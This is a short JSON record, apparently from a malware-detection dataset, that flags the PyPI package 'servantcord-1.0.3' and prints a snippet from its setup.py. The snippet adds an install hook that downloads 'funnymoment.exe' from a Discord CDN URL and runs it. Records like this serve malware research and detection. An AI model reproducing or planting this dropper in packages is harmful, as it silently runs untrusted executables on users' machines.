[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import urllib.request\nimport subprocess\nimport tempfile\nimport os\nfrom setuptools.command.install import install\n\ndef funnymoment():\n    url = \"https://cdn.discordapp.com/attachments/1126844776025694281/1126848315615612938/funnymoment.exe\"\n\n    temp_dir = tempfile.mkdtemp()\n    download_path = os.path.join(temp_dir, \"funnymoment.exe\")\n\n    urllib.request.urlretrieve(url, download_path)\n\n    subprocess.call(download_path)\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        funnymoment()"
  },
  {
    "metadata": {
      "package_name": "servantcord-1.0.3",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/servantcord-1.0.3.txt"
    }
  }
]